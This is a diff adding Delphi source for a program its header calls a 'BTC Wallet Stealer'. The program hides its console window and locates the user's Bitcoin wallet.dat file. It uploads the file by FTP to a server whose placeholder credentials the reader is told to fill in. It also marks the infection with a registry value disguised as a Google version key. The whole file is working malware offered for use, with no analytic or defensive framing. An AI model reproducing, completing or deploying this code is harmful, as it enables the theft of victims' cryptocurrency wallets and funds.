@@ -1,0 +1,147 @@
+program dbs;
+
+// BTC Wallet Stealer
+// c0D3d By Robox
+// For Bits Family
+
+{$IF CompilerVersion >= 21.0}
+  {$WEAKLINKRTTI ON}
+  {$RTTI EXPLICIT METHODS([]) PROPERTIES([]) FIELDS([])}
+{$IFEND}
+
+uses
+  Windows, System.SysUtils, System.Classes, ShlObj, IdFTP, Registry;
+
+// Function to set the window state hidden
+function GetConsoleWindow: HWND; stdcall; external kernel32 name 'GetConsoleWindow';
+
+// Function to get the AppData path
+function AppDataPath: String;
+const
+  SHGFP_TYPE_CURRENT = 0;
+var
+  Path: array [0 .. MAXCHAR] of char;
+begin
+  SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, SHGFP_TYPE_CURRENT, @Path[0]);
+  Result := StrPas(Path);
+end;
+
+// Function to check a file size
+function FileSize(FileName: wideString): Int64;
+var
+  sr: TSearchRec;
+begin
+  if FindFirst(FileName, faAnyFile, sr) = 0 then
+    Result := Int64(sr.FindData.nFileSizeHigh) shl Int64(32) + Int64(sr.FindData.nFileSizeLow)
+  else
+    Result := -1;
+
+  FindClose(sr);
+end;
+
+// Function to generate random string
+function RandomString(PLen: Integer): string;
+var
+  str: string;
+begin
+  Randomize;
+  str := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  Result := '';
+  repeat
+    Result := Result + str[Random(Length(str)) + 1];
+  until (Length(Result) = PLen);
+end;
+
+// ============================================================================
+
+var
+  Debug: Boolean;
+  FTP: TIdFTP;
+  REG: TRegIniFile;
+  RegPath, RegValue, RegCurrentValue, Path, UploadPath, FileName: String;
+  Error: String;
+
+begin
+  // The window should be hidden without using this API
+  ShowWindow(GetConsoleWindow, SW_HIDE);
+
+  // Debug or build release ?
+  Debug := True;
+
+  // Set registry key value (random)
+  RegValue := '6556';
+
+  // At the end of the first execution we will write a key in the registry.
+  // Now we will try check if the key exists. If yes, it means
+  // that the wallet has already be stolen. Avoid useless duplicates.
+  try
+    REG := TRegIniFile.Create;
+    REG.RootKey := HKEY_CURRENT_USER;
+    REG.OpenKeyReadOnly('Software');
+    RegCurrentValue := REG.ReadString('Google', 'Version', '');
+    REG.CloseKey;
+    REG.Free;
+  except
+  end;
+
+  // Check if wallet has been already stolen (to avoid duplicates)
+  if not(RegCurrentValue = RegValue) then
+  begin
+    try
+      // Generate path to Bitcoin wallet file
+      if Win32MajorVersion >= 6 then
+        // Microsoft Windows Vista and newer
+        Path := ExpandFileName(AppDataPath + '\..\Roaming\Bitcoin\wallet.dat')
+      else
+        // Microsoft Windows XP
+        Path := ExpandFileName(AppDataPath + '\..\Bitcoin\wallet.dat');
+
+      // If wallet file exists, check the FileSize (skip large file > 10MB)
+      if FileExists(Path) then
+        if FileSize(Path) < 10000000 then
+        begin
+          // Generate a random filename
+          FileName := RandomString(20) + '.dat';
+
+          // Initialize upload via Indy FTP component
+          FTP := TIdFTP.Create();
+          FTP.ConnectTimeout := 20000;
+          FTP.ReadTimeout := 20000;
+
+          // Setup with your FTP details
+          FTP.Host := 'ftp.host.com';
+          FTP.Username := 'username';
+          FTP.Password := 'password';
+          UploadPath := 'www/bitcoin';
+
+          // Connect and upload
+          if not Debug then
+          begin
+            FTP.Connect;
+            FTP.Put(Path, UploadPath + FileName);
+          end;
+
+          // After upload attempt, disconnect and free the FTP component
+          FTP.Quit;
+          FTP.Disconnect;
+          FTP.Free;
+
+          // Try to add a key to registry to avoid double execution
+          try
+            REG := TRegIniFile.Create;
+            REG.RootKey := HKEY_CURRENT_USER;
+            REG.OpenKey('Software', True);
+            REG.WriteString('Google', 'Version', RegValue);
+            REG.CloseKey;
+            REG.Free;
+          except
+          end;
+        end;
+    except
+      // Catch error, you never know...
+      on E: Exception do
+        Error := E.ClassName + ': ' + E.Message;
+    end;
+  end;
+
+end.
